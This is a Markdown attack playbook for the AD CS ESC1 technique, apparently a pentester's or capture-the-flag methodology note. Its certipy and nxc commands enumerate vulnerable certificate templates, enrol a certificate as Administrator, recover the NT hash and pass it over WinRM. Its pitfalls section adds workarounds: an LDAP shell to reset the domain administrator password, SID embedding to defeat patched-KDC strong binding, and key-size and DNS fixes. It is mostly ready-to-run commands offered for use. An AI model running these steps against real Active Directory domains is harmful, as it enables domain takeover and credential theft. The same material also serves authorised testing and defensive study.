# ADCS ESC1

## When this applies

- AD CS environment with a vulnerable certificate template.
- Template has `ENROLLEE_SUPPLIES_SUBJECT` (Name Flag & 1) AND your principal has enrollment rights.
- Goal: enrol a cert with an arbitrary UPN (e.g., `Administrator@domain`) and authenticate as that user.

## Technique

`ENROLLEE_SUPPLIES_SUBJECT` lets the requestor specify the cert's subject/SAN (UPN). Combined with a Client-Auth-capable EKU, you obtain a cert that PKINIT-authenticates as any user.

## Steps

```bash
# Enumerate
certipy find -u user@domain -dc-ip DC_IP -vulnerable -stdout

# Request cert as Administrator (or any UPN)
certipy req -u user@domain -p pass -ca CA-NAME -template VULN_TEMPLATE \
  -upn Administrator@domain -target DC_IP -dns-tcp -ns DC_IP -out admin

# Auth with cert → KDC maps by UPN → get target NT hash
certipy auth -pfx admin.pfx -dc-ip DC_IP

# PtH the recovered hash
nxc winrm DC_IP -u Administrator -H <NT_hash>
```

## Verifying success

- `certipy auth` prints the NT hash and writes a `.ccache` for the target UPN.

## Common pitfalls

**EKU Requirements** — the certificate's Extended Key Usage determines what auth methods work:

- Client Authentication (1.3.6.1.5.5.7.3.2): PKINIT ✓ (theoretical), Schannel ✓
- Smart Card Logon (1.3.6.1.4.1.311.20.2.2): PKINIT ✓
- Any Purpose (2.5.29.37.0): PKINIT ✓, Schannel ✓
- Server Authentication ONLY (1.3.6.1.5.5.7.3.1): PKINIT ✗, Schannel ✗ → DEAD END

If template has ENROLLEE_SUPPLIES_SUBJECT but only Server Auth EKU:
- `certipy auth -pfx cert.pfx` → KDC_ERR_INCONSISTENT_KEY_PURPOSE
- Schannel LDAPS → bind returns None, operations fail with "bind must be completed"

**Practical PKINIT failures with Client Auth-only EKU**: in real environments (HTB Retro, AD CS hardened deployments) PKINIT against a Client-Auth-only cert frequently returns `KDC_ERR_PADATA_TYPE_NOSUPP` even though the EKU table says it should work. Don't burn time debugging the KDC — pivot to `certipy auth -pfx <file>.pfx -ldap-shell` (Schannel/LDAPS) which authenticates by UPN SAN alone. From the LDAP shell `change_password administrator <NewPass>` is a one-shot DA, then `nxc smb DC -u Administrator -p <NewPass>` for execution.

Check EKU before investing in ESC1: `certipy find -vulnerable -stdout`. `msPKI-Certificate-Application-Policy` (v2 templates) overrides `pKIExtendedKeyUsage`. Also note `Minimum RSA Key Length` — templates often require 4096; pass `-key-size 4096` to `certipy req` or get `CERTSRV_E_KEY_LENGTH`.

**Modern KDC requires SID extension (`certipy req -sid`)** — when `certipy auth` fails with `Object SID mismatch between certificate and user`, the KDC enforces strong binding (May 2022+ patch). Re-enroll with the target's SID embedded:

```bash
# Look up target SID first (LDAP query or impacket lookupsid.py)
certipy req ... -upn Administrator@domain -sid S-1-5-21-...-500
# Cert now has SID extension matching the AD object → PKINIT succeeds
# Works for ESC1 targeting Administrator/krbtgt-class accounts on patched DCs
```

`certipy req` over a VPN with no internal DNS frequently hangs on hostname lookup; always prefer `-target <IP> -dns-tcp -ns <DC_IP>` to keep DNS in-band.

## Tools

- certipy
